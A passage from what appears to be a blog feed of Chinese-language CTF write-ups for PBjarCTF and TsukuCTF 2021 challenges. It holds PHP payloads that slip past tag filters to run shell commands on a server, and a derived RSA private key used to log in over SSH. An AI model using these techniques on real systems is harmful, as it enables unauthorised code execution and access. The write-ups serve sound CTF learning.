0x585C403bC5c7eb62BF3630c7FeF1F837603bA866, but this time no source code for you this time. Luckily, the ABI of the smart contract is the same as the previous one. Figure out how to “get()” the flag. Important: This smart contract is on Ropsten https://ropsten.etherscan.io/address/0x585C403bC5c7eb62BF3630c7FeF1F837603bA866 点击Internal Texs,访问第一个Contract https://ropsten.etherscan.io/address/0x280e7ea40d03f36a430effd3bcaf2ffa0a62e151 点击Read Contract flag:flag&#123;web3js_plus_ABI_equalls_flag&#125; readFlag30xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A. Important: This smart contract is on Ropsten https://ropsten.etherscan.io/address/0xe2a9e67bdA26Dd48c8312ea1FE6a7C111e5D7a7A#code flag:flag&#123;s3t_by_c0nstructor&#125; ProgrammersHateProgrammingjust a little different than normally. Link: http://147.182.172.217:42002/index.php &lt;?php if(isset($_POST[&quot;notewrite&quot;])) &#123; $newnote = $_POST[&quot;notewrite&quot;]; $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote); $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;&lt;script&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;&lt;/script&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd); $filename = generateRandomString(); file_put_contents(&quot;$filename.php&quot;, $notetoadd); header(&quot;location:index.php&quot;); &#125; payload &lt;?php&lt;?php echo `cat /flagflag.php`; ?&gt;?&gt; flag:flag&#123;server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we&#39;re_developing_a_really_meaningful_connection&#125; ProgrammersHateProgramming 2oh noes now there are more filters :(( Link: http://147.182.172.217:42007/ &lt;?php if(isset($_POST[&quot;notewrite&quot;])) &#123; $newnote = $_POST[&quot;notewrite&quot;]; $notetoadd = str_replace_first(&quot;&lt;?php&quot;, &quot;&quot;, $newnote); $notetoadd = str_replace_first(&quot;?&gt;&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;&lt;?&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace_first(&quot;flag&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fopen&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fread&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;file_get_contents&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;fgets&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cat&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;strings&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;less&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;more&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;head&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tail&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;dd&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;cut&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;grep&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;tac&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;awk&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;sed&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;read&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;ls&quot;, &quot;&quot;, $notetoadd); $notetoadd = str_replace(&quot;ZeroDayTea is not hot&quot;, &quot;&quot;, $notetoadd); $filename = generateRandomString(); file_put_contents(&quot;$filename.php&quot;, $notetoadd); header(&quot;location:index.php&quot;); &#125; ?&gt; payload &lt;?php&lt;?&lt;?php echo `sort /flagflag.php`; ?&gt;?&gt; flag:flag&#123;wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)&#125; cOrLDescriptions are hard give me a break. (Think of common usernames and passwords for admin) Link: http://147.182.172.217:42003/ 访问题目给出的链接，是一个简单的登录表单。用admin:admin登录 使用Burp Suitel拦截请求，将HTTP请求方式修改为Put即可: flag:flag&#123;HTTP_r3qu35t_m3th0d5_ftw&#125;","date_published":"2021-09-23T08:45:05.000Z","tags":["CTF","CTF","PBjarCTF"]},{"id":"https://zhaoqi.vip/posts/434189373/","url":"https://zhaoqi.vip/posts/434189373/","title":"TsukuCTF2021 Writeup","content_html":"<h1 id=\"CrackSSH\"><a href=\"#CrackSSH\" class=\"headerlink\" title=\"CrackSSH!\"></a>CrackSSH!</h1><p><em>調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが…。なんとかして侵入しなければ。</em><br><em>Target: frt.hongo.wide.ad.jp</em><br><em>Port: 30022</em></p>\n<hr>\n<p>题目中给了一个公钥:</p>\n<pre><code class=\"asciiarmor\">ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp\n</code></pre>\n<p>参考知乎(<a href=\"https://zhuanlan.zhihu.com/p/33949377\">ssh-keygen生成的id_rsa文件的格式</a>)上的的一篇文章:</p>\n<p>首先,<code>awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C</code>,得到:</p>\n<pre><code class=\"assembly\">00000000  00 00 00 07 73 73 68 2d  72 73 61 00 00 00 81 01  |....ssh-rsa.....|\n00000010  62 80 d6 16 23 ba f8 71  8b 00 86 2a c1 be 9d b2  |b...#..q...*....|\n00000020  e3 fe 26 32 ea 94 70 92  49 1a eb 82 7a 2f e5 4b  |..&amp;2..p.I...z/.K|\n00000030  3e 9e 0a dc 95 52 44 41  33 9b 3b 40 5b 18 e4 84  |&gt;....RDA3.;@[...|\n00000040  63 a5 7a 89 77 bf 30 d1  a9 1d 89 fb 89 d2 54 e2  |c.z.w.0.......T.|\n00000050  3d 16 12 72 88 17 52 80  40 a6 5c 96 28 8c 65 52  |=..r..R.@.\\.(.eR|\n00000060  53 9e 9b 08 c7 5c ca c1  24 29 85 73 e5 ed 3e c5  |S....\\..$).s..&gt;.|\n00000070  00 23 64 3a e8 b6 99 be  15 3d 15 01 dc 1d 5a e6  |.#d:.....=....Z.|\n00000080  4c eb cc d9 63 c0 c4 f4  7d ae a3 d7 5a 1c 27 ff  |L...c...&#125;...Z.&#39;.|\n00000090  00 00 00 81 02 01 f9 8f  ba 8e 6f 71 bc d8 9b 9d  |..........oq....|\n000000a0  92 c8 a0 0b c8 56 fd 46  7e 56 e3 43 90 28 2a 9e  |.....V.F~V.C.(*.|\n000000b0  76 c8 fa be de 74 6b d4  dd 5a 6a 55 e1 1d 5d 69  |v....tk..ZjU..]i|\n000000c0  5d cc 1a d7 2a da f3 5f  83 14 3b 2e e1 b7 69 3c  |]...*.._..;...i&lt;|\n000000d0  2e df db 9a 4b ae 20 59  29 a4 8d 4f b2 b4 fa c4  |....K. Y)..O....|\n000000e0  50 74 fe 74 88 16 98 8e  c1 76 0b 28 3c 1e 3a 1e  |Pt.t.....v.(&lt;.:.|\n000000f0  19 a5 d5 92 1d db 3b 0d  95 d9 6c 14 b1 4e 2a 12  |......;...l..N*.|\n00000100  bf 53 8c f6 cc ce b0 82  c6 41 43 40 f9 f0 3b 09  |.S.......AC@..;.|\n00000110  a2 59 03 3c 19                                    |.Y.&lt;.|\n00000115\n</code></pre>\n<ul>\n<li><p>前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是<code>ssh-rsa</code>的ASCII码</p>\n</li>\n<li><p>接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制</p>\n</li>\n<li><p>再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制</p>\n<pre><code class=\"shell\">~$ echo &quot;$((16#00000081))&quot;\n129\n~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;)\n~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e\n0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c\n~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n\nbf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021\n</code></pre>\n</li>\n</ul>\n<blockquote>\n<p>官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式</p>\n<pre><code class=\"shell\">~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse\n    0:d=0  hl=4 l= 264 cons: SEQUENCE          \n    4:d=1  hl=3 l= 129 prim: INTEGER  :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19\n  136:d=1  hl=3 l= 129 prim: INTEGER  :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF\n</code></pre>\n</blockquote>\n<p>使用<a href=\"https://github.com/Ganapati/RsaCtfTool\">RsaCtfTool</a>生成私钥,保存至<code>id_rsa</code></p>\n<pre><code class=\"shell\">python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private\n</code></pre>\n<pre><code class=\"asciiarmor\">-----BEGIN RSA PRIVATE KEY-----\nMIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a\nalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2\nCyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi\ngNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj\npXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA\nI2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM\nOZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP\n+WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/\nKS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO\nOgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO\ncP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2\n/MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X\n-----END RSA PRIVATE KEY-----\n</code></pre>\n<pre><code class=\"shell\">chmod 600 id_rsa\nssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa\n</code></pre>\n<p><strong>flag:</strong><code>TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125;</code></p>\n<h1 id=\"digits\"><a href=\"#digits\" class=\"headerlink\" title=\"digits\"></a>digits</h1><p><em>コンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。</em><br><em><a href=\"https://tsukuctf.sechack365.com/problems/digits\">https://tsukuctf.sechack365.com/problems/digits</a></em></p>\n<hr>\n<p>访问<code>problems/digits</code>:</p>\n<pre><code class=\"json\">&#123;\n    &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;\n&#125;\n</code></pre>\n<p>题目给了源码：</p>\n<pre><code class=\"python\">from typing import Optional\nfrom fastapi import FastAPI\nimport random\n\napp = FastAPI()\nFLAG = &quot;TsukuCTF&#123;&#125;&quot;\n\n@app.get(&quot;/&quot;)\ndef main(q: Optional[str] = None):\n    print(q)\n    if q == None:\n        return &#123;\n            &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999).  example: /?q=1234567890&quot;\n        &#125;\n    if len(q) != 10:\n        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;\n    if &quot;-&quot; in q or &quot;+&quot; in q:\n        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;\n    try:\n        if not type(int(q)) is int:\n            return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;\n    except:\n        return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125;\n\n    you_are_lucky = 0\n\n    for _ in range(100):\n        idx = random.randrange(4)\n        if q[idx] &lt; &quot;0&quot;:\n            you_are_lucky += 1\n        if q[idx] &gt; &quot;9&quot;:\n            you_are_lucky += 1\n\n    if you_are_lucky &gt; 0:\n        return &#123;&quot;flag&quot;: FLAG&#125;\n    else:\n        return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125;\n</code></pre>\n<p>要求找到查询参数q的值，满足:</p>\n<ul>\n<li><code>q != None</code></li>\n<li><code>len(q) == 10</code></li>\n<li>不包含<code>-</code>和<code>+</code></li>\n<li>可以使用<code>int(q)</code>进行转换</li>\n<li>至少包含一个0-9之外的字符</li>\n</ul>\n<p><code>python</code>中使用<code>int</code>进行强制类型转换时会忽略两侧的空格，提交<code>q=   4567890</code>即可</p>\n<pre><code class=\"json\">&#123;\n    &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot;\n&#125;\n</code></pre>\n<p><strong>flag:</strong><code>TsukuCTF&#123;you_are_lucky_Tsukushi&#125; </code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"CrackSSH!調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが…。なんとかして侵入しなければ。Target: frt.hongo.wide.ad.jpPort: 30022 题目中给了一个公钥: ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp 参考知乎(ssh-keygen生成的id_rsa文件的格式)上的的一篇文章: 首先,awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C,得到: 00000000 00 00 00 07 73 73 68 2d 72 73 61 00 00 00 81 01 |....ssh-rsa.....| 00000010 62 80 d6 16 23 ba f8 71 8b 00 86 2a c1 be 9d b2 |b...#..q...*....| 00000020 e3 fe 26 32 ea 94 70 92 49 1a eb 82 7a 2f e5 4b |..&amp;2..p.I...z/.K| 00000030 3e 9e 0a dc 95 52 44 41 33 9b 3b 40 5b 18 e4 84 |&gt;....RDA3.;@[...| 00000040 63 a5 7a 89 77 bf 30 d1 a9 1d 89 fb 89 d2 54 e2 |c.z.w.0.......T.| 00000050 3d 16 12 72 88 17 52 80 40 a6 5c 96 28 8c 65 52 |=..r..R.@.\\.(.eR| 00000060 53 9e 9b 08 c7 5c ca c1 24 29 85 73 e5 ed 3e c5 |S....\\..$).s..&gt;.| 00000070 00 23 64 3a e8 b6 99 be 15 3d 15 01 dc 1d 5a e6 |.#d:.....=....Z.| 00000080 4c eb cc d9 63 c0 c4 f4 7d ae a3 d7 5a 1c 27 ff |L...c...&#125;...Z.&#39;.| 00000090 00 00 00 81 02 01 f9 8f ba 8e 6f 71 bc d8 9b 9d |..........oq....| 000000a0 92 c8 a0 0b c8 56 fd 46 7e 56 e3 43 90 28 2a 9e |.....V.F~V.C.(*.| 000000b0 76 c8 fa be de 74 6b d4 dd 5a 6a 55 e1 1d 5d 69 |v....tk..ZjU..]i| 000000c0 5d cc 1a d7 2a da f3 5f 83 14 3b 2e e1 b7 69 3c |]...*.._..;...i&lt;| 000000d0 2e df db 9a 4b ae 20 59 29 a4 8d 4f b2 b4 fa c4 |....K. Y)..O....| 000000e0 50 74 fe 74 88 16 98 8e c1 76 0b 28 3c 1e 3a 1e |Pt.t.....v.(&lt;.:.| 000000f0 19 a5 d5 92 1d db 3b 0d 95 d9 6c 14 b1 4e 2a 12 |......;...l..N*.| 00000100 bf 53 8c f6 cc ce b0 82 c6 41 43 40 f9 f0 3b 09 |.S.......AC@..;.| 00000110 a2 59 03 3c 19 |.Y.&lt;.| 00000115 前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是ssh-rsa的ASCII码 接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制 再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制 ~$ echo &quot;$((16#00000081))&quot; 129 ~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;) ~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e 0100010000020100e5f95a4428736b17d113d90b86eba7d9052ebec087c808fd3e5704a10b2df04638b309f0e7cae4b0cd5bcefbfae5c28f681edbedaf10e35c77201380f4d309b337c8e0c62e815a967d18c9a4642fb1ebc44ea3a4a75335d097135895a7604e1662c6df43d61212f389288f4e717e4e6ebec06ce1fc5b1d4c2c ~$ n=$&#123;N: -129*2&#125; &amp;&amp; echo $n bf582bcc145ea7b5b398b0c51c06be2d367248f6c247653e928bb317a290d7e7a99c169999cf0dbc56f875948d236da894abf2c8b4aac54d5dcb2b6ac8bfb1f9d87416a94a46e70d3083811a0397dcc8abea0b7e1b88fd230f05fd5d45de5bdee21d535aea684749a5c576d8b6e96aa358175f8f7666f27e9729fab06e25ac8021 官方的Writeup给了另一种做法,可以直接得到e和n的16进制表示形式 ~$ ssh-keygen -f crackssh.pub -e -m pem | openssl asn1parse 0:d=0 hl=4 l= 264 cons: SEQUENCE 4:d=1 hl=3 l= 129 prim: INTEGER :0201F98FBA8E6F71BCD89B9D92C8A00BC856FD467E56E34390282A9E76C8FABEDE746BD4DD5A6A55E11D5D695DCC1AD72ADAF35F83143B2EE1B7693C2EDFDB9A4BAE205929A48D4FB2B4FAC45074FE748816988EC1760B283C1E3A1E19A5D5921DDB3B0D95D96C14B14E2A12BF538CF6CCCEB082C6414340F9F03B09A259033C19 136:d=1 hl=3 l= 129 prim: INTEGER :016280D61623BAF8718B00862AC1BE9DB2E3FE2632EA947092491AEB827A2FE54B3E9E0ADC95524441339B3B405B18E48463A57A8977BF30D1A91D89FB89D254E23D1612728817528040A65C96288C6552539E9B08C75CCAC124298573E5ED3EC50023643AE8B699BE153D1501DC1D5AE64CEBCCD963C0C4F47DAEA3D75A1C27FF 使用RsaCtfTool生成私钥,保存至id_rsa python RsaCtfTool.py -n 360925413365609656207284763303112593050686426607629131354843699618905677197872793512380288223361149508460688151102823348462592916817609977273908821217493993702786929282477487755465976082059834867631026295714550319202482180891845062064382568022072228888091051431136923983143306662931216184662445381040847666201 -e 248940659700671391171916045022225211367167934215525303038734152650593067612113589541083076628705613883775652505492831370527586438096113903892713520850387855997035509546247913887222055672708066391999421835495881798128330308530099218984443115901043292942963247939575084326452874538239309850357410618060448737279 --private -----BEGIN RSA PRIVATE KEY----- MIICOQIBAAKBgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1a alXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2 Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQKBgQFi gNYWI7r4cYsAhirBvp2y4/4mMuqUcJJJGuuCei/lSz6eCtyVUkRBM5s7QFsY5IRj pXqJd78w0akdifuJ0lTiPRYScogXUoBAplyWKIxlUlOemwjHXMrBJCmFc+XtPsUA I2Q66LaZvhU9FQHcHVrmTOvM2WPAxPR9rqPXWhwn/wIgNHyza85w/fnNPOZwpCTM OZ6242GZZRcNX4iFJaXeun8CQQEL5ReRSsEcF106aHY8Yohd4FxaChPms4M8/DXP +WMC6GT0qWRj3LZYkndvP2WxVOoZYxf0rQc+ew9rFVaZ6OotAkEB6ydXjs82dKS/ KS3ffoUyj4oh7viR9j3fH5WBep9S0MeyVZc16Cwj0mPZDRbL1n7Cs0oSZD/A4FzO OgWAxc2pHQIgNHyza85w/fnNPOZwpCTMOZ6242GZZRcNX4iFJaXeun8CIDR8s2vO cP35zTzmcKQkzDmetuNhmWUXDV+IhSWl3rp/AkBdum7eZMxE/VYX7QV9xND/bpn2 /MHD4BHF8c/MirawY5HC/RTviwnfpXAoF4ArBY1ZG3nCn9L19v/sUcFQKC9X -----END RSA PRIVATE KEY----- chmod 600 id_rsa ssh tsukushi@frt.hongo.wide.ad.jp -p 30022 -i id_rsa flag:TsukuCTF&#123;D0nt_use_w34k_RS4_key_generat10n&#125; digitsコンピュータは高速に正しく計算してくれますが、昔のコンピュータは今ほど正確に計算できないことがありました。現在もハードウェアの故障などが原因でとても低い確率でコンピュータは計算をミスするでしょう。 運が良いあなたならこの問題が解けるはずです。10 桁の好きな数字をクエリパラメータ q に入れて、神に祈りましょう。https://tsukuctf.sechack365.com/problems/digits 访问problems/digits: &#123; &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999). example: /?q=1234567890&quot; &#125; 题目给了源码： from typing import Optional from fastapi import FastAPI import random app = FastAPI() FLAG = &quot;TsukuCTF&#123;&#125;&quot; @app.get(&quot;/&quot;) def main(q: Optional[str] = None): print(q) if q == None: return &#123; &quot;msg&quot;: &quot;please input param &#39;q&#39; (0000000000~9999999999). example: /?q=1234567890&quot; &#125; if len(q) != 10: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; if &quot;-&quot; in q or &quot;+&quot; in q: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; try: if not type(int(q)) is int: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; except: return &#123;&quot;msg&quot;: &quot;invalid query&quot;&#125; you_are_lucky = 0 for _ in range(100): idx = random.randrange(4) if q[idx] &lt; &quot;0&quot;: you_are_lucky += 1 if q[idx] &gt; &quot;9&quot;: you_are_lucky += 1 if you_are_lucky &gt; 0: return &#123;&quot;flag&quot;: FLAG&#125; else: return &#123;&quot;msg&quot;: &quot;Sorry... You&#39;re unlucky.&quot;&#125; 要求找到查询参数q的值，满足: q != None len(q) == 10 不包含-和+ 可以使用int(q)进行转换 至少包含一个0-9之外的字符 python中使用int进行强制类型转换时会忽略两侧的空格，提交q= 4567890即可 &#123; &quot;flag&quot;: &quot;TsukuCTF&#123;you_are_lucky_Tsukushi&#125;&quot; &#125; flag:TsukuCTF&#123;you_are_lucky_Tsukushi&#125;","summary":"CrackSSH!調査対象のサーバーで使われている公開鍵を入手した。噂によると、この鍵には問題があるらしいが…。なんとかして侵入しなければ。Target: frt.hongo.wide.ad.jpPort: 30022 题目中给了一个公钥: ssh-rsa AAAAB3NzaC1yc2EAAACBAWKA1hYjuvhxiwCGKsG+nbLj/iYy6pRwkkka64J6L+VLPp4K3JVSREEzmztAWxjkhGOleol3vzDRqR2J+4nSVOI9FhJyiBdSgECmXJYojGVSU56bCMdcysEkKYVz5e0+xQAjZDrotpm+FT0VAdwdWuZM68zZY8DE9H2uo9daHCf/AAAAgQIB+Y+6jm9xvNibnZLIoAvIVv1GflbjQ5AoKp52yPq+3nRr1N1aalXhHV1pXcwa1yra81+DFDsu4bdpPC7f25pLriBZKaSNT7K0+sRQdP50iBaYjsF2Cyg8HjoeGaXVkh3bOw2V2WwUsU4qEr9TjPbMzrCCxkFDQPnwOwmiWQM8GQ== tsukushi@frt.hongo.wide.ad.jp 参考知乎(ssh-keygen生成的id_rsa文件的格式)上的的一篇文章: 首先,awk &#39;&#123;print $2&#125;&#39; crackssh.pub | base64 -d | hexdump -C,得到: 00000000 00 00 00 07 73 73 68 2d 72 73 61 00 00 00 81 01 |....ssh-rsa.....| 00000010 62 80 d6 16 23 ba f8 71 8b 00 86 2a c1 be 9d b2 |b...#..q...*....| 00000020 e3 fe 26 32 ea 94 70 92 49 1a eb 82 7a 2f e5 4b |..&amp;2..p.I...z/.K| 00000030 3e 9e 0a dc 95 52 44 41 33 9b 3b 40 5b 18 e4 84 |&gt;....RDA3.;@[...| 00000040 63 a5 7a 89 77 bf 30 d1 a9 1d 89 fb 89 d2 54 e2 |c.z.w.0.......T.| 00000050 3d 16 12 72 88 17 52 80 40 a6 5c 96 28 8c 65 52 |=..r..R.@.\\.(.eR| 00000060 53 9e 9b 08 c7 5c ca c1 24 29 85 73 e5 ed 3e c5 |S....\\..$).s..&gt;.| 00000070 00 23 64 3a e8 b6 99 be 15 3d 15 01 dc 1d 5a e6 |.#d:.....=....Z.| 00000080 4c eb cc d9 63 c0 c4 f4 7d ae a3 d7 5a 1c 27 ff |L...c...&#125;...Z.&#39;.| 00000090 00 00 00 81 02 01 f9 8f ba 8e 6f 71 bc d8 9b 9d |..........oq....| 000000a0 92 c8 a0 0b c8 56 fd 46 7e 56 e3 43 90 28 2a 9e |.....V.F~V.C.(*.| 000000b0 76 c8 fa be de 74 6b d4 dd 5a 6a 55 e1 1d 5d 69 |v....tk..ZjU..]i| 000000c0 5d cc 1a d7 2a da f3 5f 83 14 3b 2e e1 b7 69 3c |]...*.._..;...i&lt;| 000000d0 2e df db 9a 4b ae 20 59 29 a4 8d 4f b2 b4 fa c4 |....K. Y)..O....| 000000e0 50 74 fe 74 88 16 98 8e c1 76 0b 28 3c 1e 3a 1e |Pt.t.....v.(&lt;.:.| 000000f0 19 a5 d5 92 1d db 3b 0d 95 d9 6c 14 b1 4e 2a 12 |......;...l..N*.| 00000100 bf 53 8c f6 cc ce b0 82 c6 41 43 40 f9 f0 3b 09 |.S.......AC@..;.| 00000110 a2 59 03 3c 19 |.Y.&lt;.| 00000115 前4个字节(00 00 00 07)表示接下来的数据块是7个字节,接下来7个字节的内容是73 73 68 2d 72 73 61,正好是ssh-rsa的ASCII码 接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到e的16进制 再接下来四个字节(00 00 00 81)表示接下来的数据块是0x81个字节,得到n的16进制 ~$ echo &quot;$((16#00000081))&quot; 129 ~$ N=$(awk &#39;&#123;print $2&#125;&#39; ~/.ssh/id_rsa.pub | base64 -d | hexdump -ve &#39;1/1 &quot;%.2x&quot;&#39;) ~$ e=$&#123;N: 30:129*2&#125; &amp;&amp; echo $e 